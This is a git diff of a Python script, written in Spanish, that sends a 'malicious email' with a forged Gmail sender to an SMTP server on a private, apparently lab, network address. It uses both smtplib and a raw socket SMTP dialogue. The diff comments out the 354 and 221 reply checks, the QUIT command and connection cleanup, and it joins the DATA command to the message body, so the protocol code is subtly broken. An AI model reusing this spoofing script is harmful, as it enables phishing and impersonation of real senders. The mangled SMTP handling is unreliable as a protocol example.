@@ -11,7 +11,7 @@ def enviar_correo_malicioso(remitente, destinatario, asunto, cuerpo, servidor_sm
 	mensaje['Subject'] = asunto
 
 	try:
-		# Conectar al servidor SMTP y enviar el correo electrónico
+		# (DATA not implemented)
 		servidor = smtplib.SMTP(servidor_smtp, puerto_smtp)
 		servidor.sendmail(remitente, [destinatario], mensaje.as_string())
 		servidor.quit()
@@ -47,7 +47,7 @@ async def enviar_correo_telnet(asunto, remitente, destinatario, cuerpo, servidor
 	# cuerpo
         writer.write(f"DATA + {cuerpo}\r\n")
         await writer.drain()
-        await reader.readuntil(b"354")
+        #await reader.readuntil(b"354")
 
 	# enviar todo
         # message = f"Subject: {asunto}\r\n"
@@ -61,13 +61,13 @@ async def enviar_correo_telnet(asunto, remitente, destinatario, cuerpo, servidor
         # await reader.readuntil(b"250")
 
 	# quit command
-        writer.write(b"QUIT\r\n")
-        await writer.drain()
-        await reader.readuntil(b"221")
+        #writer.write(b"QUIT\r\n")
+        #await writer.drain()
+        #await reader.readuntil(b"221")
 
 	# close connection
         writer.close()
-        await writer.wait_closed()
+        #await writer.waitclosed()
 
         print("[+] Correo electrónico malicioso enviado con éxito.")
     except Exception as e:
@@ -84,9 +84,9 @@ async def main():
 	puerto_smtp = 25
 
 	remitente = "correofalso@gmail.com"
-	#enviar_correo_malicioso(remitente, destinatario, asunto, cuerpo, "172.18.0.2", puerto_smtp)
+	#enviar_correo_malicioso(remitente, destinatario, asunto, cuerpo, "172.18.0.3", puerto_smtp)
 
-	await enviar_correo_telnet(asunto, remitente, destinatario, cuerpo, "172.18.0.2")
+	await enviar_correo_telnet(asunto, remitente, destinatario, cuerpo, "172.18.0.3")
 
 import asyncio
 
